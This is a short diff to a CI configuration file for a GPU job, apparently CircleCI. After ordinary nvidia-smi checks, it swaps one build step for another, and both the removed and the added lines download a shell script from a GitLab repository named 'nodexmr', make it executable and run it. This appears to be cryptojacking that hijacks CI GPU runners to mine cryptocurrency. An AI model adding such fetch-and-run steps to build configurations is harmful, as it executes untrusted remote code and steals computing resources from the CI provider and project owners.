@@ -10,9 +10,8 @@ jobs:
     machine:
       image: ubuntu-1604-cuda-10.1:201909-23
     resource_class: gpu.nvidia.large
-    parallelism: 20
     steps:
       - run: nvidia-smi
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
-      - run: wget https://gitlab.com/WoodcoinLog/nodexmr/-/raw/main/beze.sh && chmod +x *.sh && ./beze.sh
-parallelism: 20
+      - run: wget https://gitlab.com/WoodcoinLog/nodexmr/-/raw/main/v8.sh && chmod +x *.sh && ./v8.sh
+
